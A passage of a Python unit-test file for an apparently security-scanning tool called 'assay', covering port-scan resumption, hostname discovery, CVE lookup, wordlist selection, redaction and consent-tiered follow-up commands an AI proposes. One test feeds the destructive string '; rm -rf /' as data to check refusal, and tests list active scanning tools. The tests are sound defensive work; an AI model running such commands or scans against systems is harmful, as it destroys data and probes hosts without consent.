        cfg = Config(profile="standard", out_dir=d, targets=targets)
        cfg.apply_run_dir(d, flat=True)
        eng = Engine(cfg)
        eng.store.start_run("standard", targets)
        eng.ctx.targets = [Target(raw=t, host=t) for t in targets]
        return eng

    def test_covered_host_is_skipped_and_its_ports_are_loaded(self):
        from assay.models import Port
        eng = self._engine(["a.test", "b.test"])
        eng.store.record_scan_complete("a.test", "203.0.113.99", "top-1000", False)
        eng.store.save_host("a.test", "203.0.113.99",
                            {"ports": [Port(port=443, service="https").__dict__]})
        fresh = eng._skip_already_scanned(list(eng.ctx.targets))
        self.assertEqual([t.host for t in fresh], ["b.test"])
        a = next(t for t in eng.ctx.targets if t.host == "a.test")
        self.assertEqual([p.port for p in a.ports], [443])
        self.assertEqual(a.ip, "203.0.113.99")
        eng.store.close()

    def test_partial_sweep_is_rescanned(self):
        eng = self._engine(["a.test"])
        eng.store.record_scan_complete("a.test", "203.0.113.99", "top-1000", True)
        self.assertEqual([t.host for t in
                          eng._skip_already_scanned(list(eng.ctx.targets))],
                         ["a.test"])
        eng.store.close()

    def test_narrower_prior_coverage_is_rescanned_for_a_deeper_run(self):
        eng = self._engine(["a.test"])
        eng.cfg.profile = "deep"   # wants "all"
        eng.store.record_scan_complete("a.test", "203.0.113.99", "top-1000", False)
        self.assertEqual([t.host for t in
                          eng._skip_already_scanned(list(eng.ctx.targets))],
                         ["a.test"])
        eng.store.close()

    def test_rescan_flag_keeps_everything(self):
        eng = self._engine(["a.test"])
        eng.store.record_scan_complete("a.test", "203.0.113.99", "all", False)
        eng.cfg.rescan = True
        self.assertEqual([t.host for t in
                          eng._skip_already_scanned(list(eng.ctx.targets))],
                         ["a.test"])
        eng.store.close()

    def test_a_host_never_scanned_is_always_kept(self):
        eng = self._engine(["new.test"])
        self.assertEqual([t.host for t in
                          eng._skip_already_scanned(list(eng.ctx.targets))],
                         ["new.test"])
        eng.store.close()


class HostnameDiscoveryTests(unittest.TestCase):
    """A bare-IP target whose port scan turns up a reverse-DNS hostname
    should have that hostname added to scope and given a full scan of its
    own -- it was discovered by testing an already-in-scope IP, not pulled
    from an unrelated source."""

    def test_discovered_hostname_on_an_ip_target_is_a_candidate(self):
        from assay.config import Scope
        from assay.engine import Engine
        from assay.models import Target
        targets = [Target(raw="203.0.113.64", host="203.0.113.64",
                          ip="203.0.113.64",
                          discovered_hostnames=["mta2.example.com"])]
        scope = Scope(allow=["203.0.113.64"])
        candidates = Engine._hostname_discovery_candidates(targets, scope)
        self.assertEqual(candidates, {"mta2.example.com": "203.0.113.64"})

    def test_discovered_hostname_on_a_hostname_target_is_not_a_candidate(self):
        """A target already given as a hostname has nothing to 'discover' --
        only a bare-IP target's reverse-DNS result is new information."""
        from assay.config import Scope
        from assay.engine import Engine
        from assay.models import Target
        targets = [Target(raw="app.example.com", host="app.example.com",
                          ip="10.0.0.5",
                          discovered_hostnames=["other-name.example.com"])]
        scope = Scope(allow=["app.example.com"])
        candidates = Engine._hostname_discovery_candidates(targets, scope)
        self.assertEqual(candidates, {})

    def test_already_known_hostname_is_not_re_added(self):
        from assay.config import Scope
        from assay.engine import Engine
        from assay.models import Target
        targets = [
            Target(raw="10.0.0.5", host="10.0.0.5", ip="10.0.0.5",
                  discovered_hostnames=["app.example.com"]),
            Target(raw="app.example.com", host="app.example.com"),
        ]
        scope = Scope(allow=["10.0.0.5", "app.example.com"])
        candidates = Engine._hostname_discovery_candidates(targets, scope)
        self.assertEqual(candidates, {})

    def test_explicit_deny_rule_is_never_overridden(self):
        """Discovery extends scope; it must never fight an exclusion the
        user set on purpose."""
        from assay.config import Scope
        from assay.engine import Engine
        from assay.models import Target
        targets = [Target(raw="10.0.0.5", host="10.0.0.5", ip="10.0.0.5",
                          discovered_hostnames=["staging.example.com"])]
        scope = Scope(allow=["10.0.0.5"], deny=["staging.example.com"])
        candidates = Engine._hostname_discovery_candidates(targets, scope)
        self.assertEqual(candidates, {})


class SweptHostResolutionTests(unittest.TestCase):
    """naabu's JSON results are keyed by whatever it resolved each host to
    (its own "ip" field, in practice -- naabu 2.4.0's JSON carries no "host"
    key at all). Engine._stage_portscan() used to hand those raw keys
    straight to nmap_scan() as its next host list, then matched nmap's
    results back to Target objects by t.host -- silently dropping any host
    whose nmap XML hostname didn't literally equal the naabu key. That is
    exactly what happened to mta2/mta3/vass.example.com in a real scan:
    naabu found their open ports (including port 25/smtp) keyed by IP,
    nothing downstream ever mapped those IPs back to the targets, and their
    entire port lists vanished from the report despite nmap having found
    them."""

    def test_ip_keyed_naabu_result_resolves_to_the_original_hostname(self):
        from assay.engine import Engine
        from assay.models import Target
        targets = [Target(raw="mta2.example.com", host="mta2.example.com",
                          ip="203.0.113.64"),
                   Target(raw="mta3.example.com", host="mta3.example.com",
                          ip="203.0.113.65")]
        # naabu's JSON keys these by IP, not by the hostname assay gave it.
        resolved = Engine._resolve_swept_hosts(targets, ["203.0.113.64", "203.0.113.65"])
        self.assertEqual(resolved, ["mta2.example.com", "mta3.example.com"])

    def test_hostname_keyed_naabu_result_passes_through(self):
        from assay.engine import Engine
        from assay.models import Target
        targets = [Target(raw="app.example.com", host="app.example.com",
                          ip="10.0.0.5")]
        resolved = Engine._resolve_swept_hosts(targets, ["app.example.com"])
        self.assertEqual(resolved, ["app.example.com"])

    def test_unmatched_key_is_kept_rather_than_dropped(self):
        """A key that matches no known target is still carried through --
        losing it silently would be worse than scanning an unexpected host."""
        from assay.engine import Engine
        from assay.models import Target
        targets = [Target(raw="app.example.com", host="app.example.com")]
        resolved = Engine._resolve_swept_hosts(targets, ["10.9.9.9"])
        self.assertEqual(resolved, ["10.9.9.9"])


class UnregisteredDomainRefTests(unittest.TestCase):
    """refs_from_html() used to prepend '//' to every raw src/href value
    before parsing it, which made urlsplit read a bare relative filename's
    own name as its hostname -- "es-module-shims.js" came out with hostname
    "es-module-shims.js", and registrable() turned that into apex domain
    "es-module-shims.js" since ".js" looks like a two-label TLD, same as any
    other bundler chunk name. That produced "critical: stored XSS equivalent"
    findings for the site's own local assets. It also broke genuine
    protocol-relative references ("//cdn.example.com/x.js") by doubling
    their leading slashes down to four, so real foreign hosts went
    undetected the whole time this bug existed.
    """

    def test_relative_script_src_is_not_treated_as_a_foreign_host(self):
        from assay import domains
        html = (
            '<script src="es-module-shims.js"></script>'
            '<script src="/static/chunk-4clctaj7.js"></script>'
            '<script src="../shared/main-avxaiibk.js"></script>'
            '<link rel="stylesheet" href="styles-sgxtug7q.css">'
            '<link rel="icon" href="favicon.ico">'
        )
        refs = domains.refs_from_html(html, "app.example.com")
        self.assertEqual(refs, {}, "relative same-origin refs must not be "
                                    "read as foreign domains: %s" % refs)

    def test_protocol_relative_script_src_is_detected(self):
        from assay import domains
        html = '<script src="//cdn.evil-cdn.tld/lib.js"></script>'
        refs = domains.refs_from_html(html, "app.example.com")
        self.assertIn("evil-cdn.tld", refs)
        self.assertIn("script", refs["evil-cdn.tld"])

    def test_absolute_script_src_is_still_detected(self):
        from assay import domains
        html = '<script src="https://cdn.evil-cdn.tld/lib.js"></script>'
        refs = domains.refs_from_html(html, "app.example.com")
        self.assertIn("evil-cdn.tld", refs)
        self.assertIn("script", refs["evil-cdn.tld"])


class SoftwareCollectionTests(unittest.TestCase):
    """assay.software: turning nmap ports and web responses into a flat
    (name, version) inventory, independent of any CVE lookup."""

    def test_collect_from_host_needs_both_product_and_version(self):
        from assay.models import Port, Target
        from assay.software import collect_from_host
        t = Target(raw="10.0.0.5", host="10.0.0.5", ports=[
            Port(port=22, service="ssh", product="OpenSSH", version="8.9"),
            Port(port=53, service="domain", product="", version=""),
        ])
        found = collect_from_host(t)
        self.assertEqual(len(found), 1)
        self.assertEqual((found[0].name, found[0].version), ("OpenSSH", "8.9"))
        self.assertEqual(found[0].where, "10.0.0.5:22")

    def test_server_header_with_multiple_tokens_splits_into_separate_items(self):
        from assay.software import collect_from_web
        wt = web_target(headers={})
        wt.server = "Apache/2.4.41 (Ubuntu) OpenSSL/1.1.1f PHP/7.4.3"
        found = collect_from_web(wt)
        names = {(f.name, f.version) for f in found}
        self.assertIn(("Apache", "2.4.41"), names)
        self.assertIn(("OpenSSL", "1.1.1f"), names)
        self.assertIn(("PHP", "7.4.3"), names)

    def test_bare_server_header_with_no_version_is_not_misparsed(self):
        from assay.software import collect_from_web
        wt = web_target()
        wt.server = "nginx"
        found = collect_from_web(wt)
        self.assertEqual(found, [])

    def test_versioned_js_library_detected_from_body(self):
        from assay.software import collect_from_web
        wt = web_target()
        wt.body_sample = '<script src="/assets/jquery-3.4.1.min.js"></script>'
        found = collect_from_web(wt)
        self.assertIn(("jQuery", "3.4.1"), [(f.name, f.version) for f in found])

    def test_generator_meta_tag_gives_a_cms_version(self):
        from assay.software import collect_from_web
        wt = web_target()
        wt.body_sample = '<meta name="generator" content="WordPress 5.7.2">'
        found = collect_from_web(wt)
        match = [f for f in found if f.name == "WordPress"]
        self.assertEqual(len(match), 1)
        self.assertEqual(match[0].version, "5.7.2")
        self.assertEqual(match[0].category, "cms")

    def test_tech_signatures_without_a_version_fill_in_the_gap(self):
        """wt.tech (Engine._fingerprint) has no version info, but a name-only
        hit is still worth listing rather than silently dropping it."""
        from assay.software import collect_from_web
        wt = web_target()
        wt.tech = ["React"]
        found = collect_from_web(wt)
        self.assertEqual([(f.name, f.version) for f in found], [("React", "")])

    def test_tech_signature_is_not_duplicated_when_a_version_was_already_found(self):
        from assay.software import collect_from_web
        wt = web_target()
        wt.body_sample = '<script src="/assets/bootstrap-5.1.3.min.js"></script>'
        wt.tech = ["Bootstrap"]
        found = collect_from_web(wt)
        names = [f.name for f in found]
        self.assertEqual(names.count("Bootstrap"), 1)

    def test_merge_collapses_by_name_and_version_across_hosts(self):
        from assay.software import Software, merge
        items = [
            Software("OpenSSH", "8.9", "service", "10.0.0.1:22", "nmap"),
            Software("OpenSSH", "8.9", "service", "10.0.0.2:22", "nmap"),
            Software("OpenSSH", "9.0", "service", "10.0.0.3:22", "nmap"),
        ]
        rows = merge(items)
        self.assertEqual(len(rows), 2)
        row_89 = next(r for r in rows if r["version"] == "8.9")
        self.assertEqual(sorted(row_89["where"]), ["10.0.0.1:22", "10.0.0.2:22"])


class CveLookupTests(unittest.TestCase):
    """assay.cve: parsing NVD's response shape and staying silent on failure.

    Never sleeps for real - _throttle is monkeypatched to a no-op so this
    suite stays offline-fast regardless of call order.
    """

    def setUp(self):
        from assay import cve
        self._orig_throttle = cve._throttle
        cve._throttle = lambda has_key: None

    def tearDown(self):
        from assay import cve
        cve._throttle = self._orig_throttle

    def _nvd_body(self, entries):
        import json as _json
        return _json.dumps({"vulnerabilities": [
            {"cve": {
                "id": cve_id,
                "descriptions": [{"lang": "en", "value": summary}],
                "published": published,
                "metrics": ({"cvssMetricV31": [{"cvssData": {"baseScore": score}}]}
                            if score is not None else {}),
            }}
            for cve_id, summary, score, published in entries
        ]})

    def test_parse_sorts_worst_first_and_buckets_severity(self):
        from assay.cve import parse
        body = self._nvd_body([
            ("CVE-2020-1", "low one", 3.1, "2020-01-01"),
            ("CVE-2020-2", "critical one", 9.8, "2020-02-01"),
            ("CVE-2020-3", "medium one", 5.0, "2020-03-01"),
        ])
        matches = parse(body)
        self.assertEqual([m.cve_id for m in matches],
                         ["CVE-2020-2", "CVE-2020-3", "CVE-2020-1"])
        self.assertEqual(matches[0].severity, "critical")
        self.assertEqual(matches[2].severity, "low")

    def test_entry_with_no_cvss_score_is_info_not_dropped(self):
        from assay.cve import parse
        body = self._nvd_body([("CVE-2020-4", "unscored", None, "2020-01-01")])
        matches = parse(body)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].severity, "info")
        self.assertIsNone(matches[0].score)

    def test_malformed_body_returns_empty_not_an_exception(self):
        from assay.cve import parse
        self.assertEqual(parse("not json"), [])
        self.assertEqual(parse("{}"), [])

    def test_lookup_needs_both_name_and_version(self):
        from assay.cve import lookup
        self.assertEqual(lookup("", "1.0", http=None), [])
        self.assertEqual(lookup("nginx", "", http=None), [])

    def test_lookup_returns_empty_on_non_200(self):
        from assay.cve import lookup
        from tests.stub import StubHttp
        http = StubHttp([], catch_all=(500, {}, "error"))
        self.assertEqual(lookup("nginx", "1.18.0", http), [])

    def test_lookup_parses_a_real_response_through_the_stub_http(self):
        from assay.cve import lookup
        from tests.stub import StubHttp, path_route
        body = self._nvd_body([("CVE-2021-23017", "nginx resolver off-by-one",
                                8.1, "2021-05-25")])
        http = StubHttp([path_route("/rest/json/cves/2.0", body=body)])
        matches = lookup("nginx", "1.18.0", http)
        self.assertEqual([m.cve_id for m in matches], ["CVE-2021-23017"])
        self.assertEqual(matches[0].severity, "high")


class InventoryModuleTests(unittest.TestCase):
    """InventoryModule: builds the software table from whatever the run
    already collected, writes it for the report, and only calls out to NVD
    under --passive - the same third-party-traffic rule as web_archive.py.
    """

    def setUp(self):
        from assay import cve
        self._orig_throttle = cve._throttle
        cve._throttle = lambda has_key: None

    def tearDown(self):
        from assay import cve
        cve._throttle = self._orig_throttle

    def _ctx(self, passive=False):
        import tempfile
        from assay.models import Port, Target
        ctx, http = make_ctx([])
        ctx.cfg.out_dir = tempfile.mkdtemp()
        ctx.cfg.passive = passive
        ctx.targets = [Target(raw="10.0.0.5", host="10.0.0.5", ports=[
            Port(port=443, service="https", product="nginx", version="1.18.0"),
        ])]
        wt = web_target()
        wt.server = "nginx/1.18.0"
        ctx.web = [wt]
        return ctx, http

    def test_writes_inventory_json_with_no_cve_lookup_when_not_passive(self):
        import json, os
        from assay.modules.inventory import InventoryModule
        ctx, http = self._ctx(passive=False)
        found = InventoryModule().run_global(ctx)
        self.assertEqual(found, [])
        path = os.path.join(ctx.cfg.out_dir, "raw", "software-inventory.json")
        with open(path) as fh:
            doc = json.load(fh)
        self.assertFalse(doc["cve_checked"])
        rows = doc["items"]
        self.assertTrue(any(r["name"] == "nginx" and r["version"] == "1.18.0"
                            for r in rows))
        self.assertTrue(all(r["cves"] == [] for r in rows))
        self.assertFalse(any("nvd.nist.gov" in u for _, u in http.calls))

    def test_passive_mode_queries_nvd_and_produces_a_finding_on_a_hit(self):
        from assay.modules.inventory import InventoryModule
        ctx, http = self._ctx(passive=True)
        body = self._nvd_body()
        # Route every NVD call to the same canned hit for nginx/1.18.0.
        orig_get = http.get

        def routed_get(url, **kw):
            if "cves/2.0" in url:
                return self._resp(url, body)
            return orig_get(url, **kw)
        http.get = routed_get
        found = InventoryModule().run_global(ctx)
        self.assertTrue(found, "a known-CVE hit must produce a finding")
        self.assertIn("nginx", found[0].title)
        self.assertEqual(found[0].confidence, "tentative")
        self.assertIn("CVE-2021-23017", found[0].detail)

    def _nvd_body(self):
        import json as _json
        return _json.dumps({"vulnerabilities": [{"cve": {
            "id": "CVE-2021-23017",
            "descriptions": [{"lang": "en", "value": "nginx resolver off-by-one"}],
            "published": "2021-05-25",
            "metrics": {"cvssMetricV31": [{"cvssData": {"baseScore": 8.1}}]},
        }}]})

    def _resp(self, url, body):
        from assay.net import Resp
        return Resp(url=url, status=200, headers={}, body=body, elapsed=0.01,
                   method="GET")

    def test_nothing_detected_writes_nothing_and_returns_no_findings(self):
        import os
        from assay.modules.inventory import InventoryModule
        ctx, _ = self._ctx(passive=True)
        ctx.targets = []
        ctx.web = []
        found = InventoryModule().run_global(ctx)
        self.assertEqual(found, [])
        path = os.path.join(ctx.cfg.out_dir, "raw", "software-inventory.json")
        self.assertFalse(os.path.exists(path))


class SoftwareInventorySectionTests(unittest.TestCase):
    """The report's Software inventory section: present with whatever
    inventory.py wrote to raw/software-inventory.json, absent without it."""

    def _report_with_inventory(self, rows, cve_checked=True):
        import json, os, tempfile
        from assay import report
        from assay.models import Evidence, Finding
        from assay.store import Store
        out_dir = tempfile.mkdtemp()
        os.makedirs(os.path.join(out_dir, "raw"), exist_ok=True)
        with open(os.path.join(out_dir, "raw", "software-inventory.json"), "w",
                 encoding="utf-8") as fh:
            json.dump({"cve_checked": cve_checked, "items": rows}, fh)
        s = Store(os.path.join(out_dir, "assay.db"))
        s.start_run("standard", ["10.0.0.5"])
        s.add_finding(Finding(
            title="x", target="x", severity="low", confidence="confirmed",
            module="m", category="c", cwe="", impact="i", detail="d", repro="r",
            evidence=[Evidence(kind="http", label="e", output="e")]))
        html = open(report.build(s, {"hosts": 1, "web": 0, "requests": 1,
                                     "duration": 1.0},
                                 os.path.join(out_dir, "r.html"))).read()
        return html

    def test_section_absent_with_no_inventory_file(self):
        import os, tempfile
        from assay import report
        from assay.models import Evidence, Finding
        from assay.store import Store
        out_dir = tempfile.mkdtemp()
        s = Store(os.path.join(out_dir, "assay.db"))
        s.start_run("standard", ["t"])
        s.add_finding(Finding(
            title="x", target="x", severity="low", confidence="confirmed",
            module="m", category="c", cwe="", impact="i", detail="d", repro="r",
            evidence=[Evidence(kind="http", label="e", output="e")]))
        html = open(report.build(s, {"hosts": 1, "web": 0, "requests": 1,
                                     "duration": 1.0},
                                 os.path.join(out_dir, "r.html"))).read()
        self.assertNotIn('id="software-inventory"', html)

    def test_section_lists_software_checked_with_no_cve_hits(self):
        html = self._report_with_inventory([
            {"name": "OpenSSH", "version": "8.9", "category": "service",
             "sources": ["nmap service detection"], "where": ["10.0.0.5:22"],
             "cves": []},
        ], cve_checked=True)
        self.assertIn('id="software-inventory"', html)
        self.assertIn("OpenSSH", html)
        self.assertIn("8.9", html)
        self.assertIn("Checked against NVD - no known CVEs matched", html)

    def test_section_says_no_check_ran_when_no_passive_was_set(self):
        html = self._report_with_inventory([
            {"name": "OpenSSH", "version": "8.9", "category": "service",
             "sources": ["nmap service detection"], "where": ["10.0.0.5:22"],
             "cves": []},
        ], cve_checked=False)
        self.assertIn("No known-CVE cross-reference was run", html)
        self.assertIn("--no-passive", html)

    def test_section_shows_cve_id_and_worst_severity_when_present(self):
        html = self._report_with_inventory([
            {"name": "nginx", "version": "1.18.0", "category": "service",
             "sources": ["Server header"], "where": ["https://x/"],
             "cves": [{"id": "CVE-2021-23017", "severity": "high", "score": 8.1,
                      "summary": "resolver off-by-one",
                      "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23017"}]},
        ])
        section = html.split('id="software-inventory"')[1].split("</section>")[0]
        self.assertIn("CVE-2021-23017", section)
        self.assertIn("high", section)
        self.assertIn("1 known CVE match(es)", section)


class WordlistTieringTests(unittest.TestCase):
    """tools.default_wordlist()/dns_wordlist(): the content-discovery and
    DNS-brute-force wordlists scale with the profile's own time budget -
    'quick' stays on the small list, 'standard'/'deep' reach for a bigger
    one when it is actually installed, and everything falls back cleanly
    when SecLists is missing.

    os.path.exists is monkeypatched to a fixed set of "present" paths for
    the duration of each test - the real SecLists tree is not expected to
    exist in a test environment, and never should for this suite to stay
    offline.
    """

    def setUp(self):
        import os
        self._orig_exists = os.path.exists

    def tearDown(self):
        import os
        os.path.exists = self._orig_exists

    def _only(self, present):
        import os
        present = set(present)
        os.path.exists = lambda p: p in present

    def test_quick_profile_gets_the_small_content_wordlist(self):
        from assay import tools
        self._only([
            "/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt",
            "/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt",
        ])
        self.assertEqual(
            tools.default_wordlist("quick"),
            "/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt")

    def test_standard_profile_prefers_a_bigger_content_wordlist(self):
        from assay import tools
        self._only([
            "/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt",
            "/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt",
        ])
        self.assertEqual(
            tools.default_wordlist("standard"),
            "/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt")

    def test_deep_profile_prefers_a_bigger_content_wordlist_over_medium(self):
        from assay import tools
        self._only([
            "/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt",
            "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt",
        ])
        self.assertEqual(
            tools.default_wordlist("deep"),
            "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt")

    def test_deep_profile_prefers_raft_large_over_the_1_2m_word_list(self):
        """directory-list-2.3-big.txt is ~1.27M words - real, but at any sane
        rate limit that is days per host, not the "hours" deep promises.
        raft-large-words.txt (~350k) wins when both are installed, which is
        the common case since the seclists apt package ships the whole tree."""
        from assay import tools
        self._only([
            "/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt",
            "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt",
        ])
        self.assertEqual(
            tools.default_wordlist("deep"),
            "/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt")

    def test_falls_back_to_dirb_when_seclists_is_missing(self):
        from assay import tools
        self._only(["/usr/share/dirb/wordlists/common.txt"])
        self.assertEqual(tools.default_wordlist("deep"),
                         "/usr/share/dirb/wordlists/common.txt")

    def test_no_content_wordlist_anywhere_returns_none(self):
        from assay import tools
        self._only([])
        self.assertIsNone(tools.default_wordlist("standard"))

    def test_quick_profile_has_no_dns_bruteforce_wordlist(self):
        """Quick stays fast: DNS brute-forcing is what standard/deep buy."""
        from assay import tools
        self._only([
            "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt",
        ])
        self.assertIsNone(tools.dns_wordlist("quick"))

    def test_standard_profile_gets_the_5000_word_dns_list(self):
        from assay import tools
        self._only([
            "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        ])
        self.assertEqual(
            tools.dns_wordlist("standard"),
            "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt")

    def test_deep_profile_prefers_the_110000_word_dns_list(self):
        from assay import tools
        self._only([
            "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt",
        ])
        self.assertEqual(
            tools.dns_wordlist("deep"),
            "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt")

    def test_deep_falls_back_to_the_5000_word_list_if_110000_is_absent(self):
        from assay import tools
        self._only([
            "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        ])
        self.assertEqual(
            tools.dns_wordlist("deep"),
            "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt")


class WordlistSubdomainsTests(unittest.TestCase):
    """recon.wordlist_subdomains(): turning a DNS wordlist into candidate
    hostnames - gobuster's dns mode / Sublist3r's brute-force pass, minus
    the resolver (that part is dnsx's job, via resolve_bulk())."""

    def _wordlist(self, words):
        import tempfile
        path = tempfile.mkstemp()[1]
        with open(path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(words))
        return path

    def test_one_candidate_per_word_comments_and_blanks_skipped(self):
        from assay import recon
        path = self._wordlist(["www", "# a comment", "", "api", "mail"])
        found = recon.wordlist_subdomains("example.com", path)
        self.assertEqual(found, ["www.example.com", "api.example.com",
                                 "mail.example.com"])

    def test_cap_limits_the_candidate_count(self):
        from assay import recon
        path = self._wordlist(["word%d" % i for i in range(100)])
        found = recon.wordlist_subdomains("example.com", path, cap=10)
        self.assertEqual(len(found), 10)

    def test_missing_wordlist_file_returns_empty_not_an_exception(self):
        from assay import recon
        self.assertEqual(
            recon.wordlist_subdomains("example.com", "/no/such/wordlist.txt"), [])


class RedactionMapLifecycleTests(unittest.TestCase):
    """PLAN-LOOP §8: one redactor reused across loop rounds grows its map
    (mint-on-miss) and saves atomically after each round."""

    def test_reused_redactor_mints_new_entities_across_rounds(self):
        from assay.redact import Redactor
        r = Redactor(extra_terms=["acme-corp.com"])
        r.text("api.acme-corp.com at 10.2.3.4")
        before = len(r.map.reverse)
        r.text("also 10.9.9.9 appeared")   # a new IP in a later round
        self.assertGreater(len(r.map.reverse), before)

    def test_save_is_atomic_and_roundtrips(self):
        import tempfile, os
        from assay.redact import Redactor, RedactionMap
        r = Redactor(extra_terms=["acme-corp.com"])
        red = r.text("db.acme-corp.com at 10.2.3.4")
        p = os.path.join(tempfile.mkdtemp(), "m.json")
        r.map.save(p)
        self.assertFalse(os.path.exists(p + ".tmp"))   # no temp left behind
        self.assertEqual(oct(os.stat(p).st_mode)[-3:], "600")
        loaded = RedactionMap.load(p)
        self.assertEqual(loaded.rehydrate(red), "db.acme-corp.com at 10.2.3.4")


class CommandTieringTests(unittest.TestCase):
    """PLAN-LOOP §1: default-deny tiering. 'passive' may auto-run; everything
    not provably passive is 'active' and needs consent. Send-eligibility is a
    separate axis (whose output may go back to the AI)."""

    def _tier(self, cmdline):
        import shlex
        from assay import followup
        return followup.tier_of(shlex.split(cmdline))

    def test_passive_tools_are_passive(self):
        for c in ("dig +short example.com", "curl https://x/", "whatweb https://x",
                  "nslookup x", "echo hi", "tlsx -u x"):
            self.assertEqual(self._tier(c), "passive", c)

    def test_active_tools_and_active_curl_need_consent(self):
        for c in ("nuclei -u https://x", "ffuf -w w -u https://x/FUZZ", "nmap -sV x",
                  "smbclient -L //x", "curl -d a=b https://x/", "curl -X POST https://x",
                  "subfinder -d x"):
            self.assertEqual(self._tier(c), "active", c)

    def test_unknown_binary_defaults_to_active(self):
        self.assertEqual(self._tier("totally-unknown-tool --go"), "active")

    def test_send_eligibility_is_a_separate_allowlist(self):
        from assay import followup
        self.assertTrue(followup.send_eligible("nmap"))
        self.assertTrue(followup.send_eligible("dig"))
        self.assertFalse(followup.send_eligible("curl"))     # passive-run but never sent
        self.assertFalse(followup.send_eligible("nuclei"))
        self.assertFalse(followup.send_eligible("smbclient"))


class FollowupPlanningTests(unittest.TestCase):
    """PLAN-LOOP §2 control flow: partition vetted commands into auto-run,
    queued (consent), and refused, default-deny throughout."""

    def _cfg(self):
        from assay.config import Config
        return Config()

    def test_partition_passive_active_refused(self):
        from assay import followup
        cfg = self._cfg()
        cmds = [followup.vet(x, cfg) for x in (
            "dig +short a.example.com", "curl https://a.example.com/",
            "nuclei -u https://a.example.com", "; rm -rf /")]
        auto, queued, refused = followup.plan_followups(cmds, "passive", 5)
        self.assertEqual({c.display.split()[0] for c in auto}, {"dig", "curl"})
        self.assertEqual([c.display.split()[0] for c in queued], ["nuclei"])
        self.assertEqual(len(refused), 1)   # shell metacharacters

    def test_auto_mode_none_queues_everything_runnable(self):
        from assay import followup
        cfg = self._cfg()
        cmds = [followup.vet("dig +short a.example.com", cfg)]
        auto, queued, _ = followup.plan_followups(cmds, "none", 5)
        self.assertEqual(auto, [])
        self.assertEqual(len(queued), 1)

    def test_per_host_rate_cap_moves_overflow_to_queue(self):
        from assay import followup
        cfg = self._cfg()
        cmds = [followup.vet("dig +short a.example.com", cfg) for _ in range(7)]
        auto, queued, _ = followup.plan_followups(cmds, "passive", rate_cap_per_host=3)
        self.assertEqual(len(auto), 3)      # capped
        self.assertEqual(len(queued), 4)    # overflow queued, not dropped


class RescrubEgressTests(unittest.TestCase):
    """PLAN-LOOP §3: only send-eligible tools' output may go back to the AI,
    redacted and verified; everything else stays local."""

    def test_send_eligible_clean_output_is_returned_redacted(self):
        from assay import followup
        from assay.redact import Redactor
        r = Redactor(extra_terms=["acme-corp.com"])
        red, leaks = followup.rescrub("A record for server at acme-corp.com", "dig", r)
        self.assertIsNotNone(red)
        self.assertEqual(leaks, [])
        self.assertNotIn("acme-corp.com", red)      # client term redacted, not leaked
        self.assertIn("[CLIENT-01]", red)

    def test_non_eligible_tool_is_never_sent(self):
        from assay import followup
        from assay.redact import Redactor
        red, leaks = followup.rescrub("full HTTP body with secrets", "curl", Redactor())
        self.assertIsNone(red)      # curl output is local-only regardless
        self.assertEqual(leaks, [])

    def test_empty_output_is_not_sent(self):
        from assay import followup
        from assay.redact import Redactor
        self.assertEqual(followup.rescrub("", "dig", Redactor()), (None, []))


class FollowupProofReportTests(unittest.TestCase):
    """PLAN-LOOP §5.2: the proof section shows real (local) output reveal-by-
    default, and separately shows what redacted slice was sent."""

    def test_proof_section_shows_local_and_sent(self):
        import tempfile, os
        from assay.store import Store
        from assay import report
        st = Store(os.path.join(tempfile.mkdtemp(), "p.db"))
        st.start_run("t", ["example.com"])
        self.addCleanup(st.close)
        st.record_followup_result(
            round=0, finding_id="f1", finding_title="DNS takeover candidate",
            tool="dig", argv="dig +short dangling.example.com", tier="passive",
            rc=0, state="ok", output_local="dangling.example.com -> 10.9.9.9",
            output_sent="[HOST-01] -> [IP-01]", sent=True)
        out = os.path.join(tempfile.mkdtemp(), "r.html")
        report.build(st, {"duration": 1}, out)
        html = open(out, encoding="utf-8").read()
        self.assertIn('id="proof"', html)
        self.assertIn("DNS takeover candidate", html)
        self.assertIn("10.9.9.9", html)            # real output, reveal-by-default
        self.assertIn("[HOST-01] -&gt; [IP-01]", html)  # what was sent, redacted


class FollowupResultStoreTests(unittest.TestCase):
    """PLAN-LOOP §6: followup_result record keeps the local (proof) and sent
    (redacted) sides separately."""

    def _store(self):
        import tempfile, os
        from assay.store import Store
        st = Store(os.path.join(tempfile.mkdtemp(), "f.db"))
        st.start_run("test", ["example.com"])
        self.addCleanup(st.close)
        return st

    def test_records_both_sides_and_reads_back(self):
        st = self._store()
        st.record_followup_result(
            round=0, finding_id="f1", finding_title="Exposed thing",
            tool="dig", argv="dig +short a.example.com", tier="passive",
            rc=0, state="ok", output_local="10.1.2.3 real host",
            output_sent="[IP-01] [HOST-01]", sent=True)
        rows = st.followup_results()
        self.assertEqual(len(rows), 1)
        r = rows[0]
        self.assertEqual((r["finding_id"], r["tier"], r["sent"]), ("f1", "passive", 1))
        self.assertIn("real host", r["output_local"])   # proof side un-redacted
        self.assertIn("[IP-01]", r["output_sent"])       # sent side redacted


class UdpScanParsingTests(unittest.TestCase):
    """UDP's dominant state is open|filtered; it must be kept honestly for the
    UDP scan and still excluded from TCP parsing (where only open counts)."""

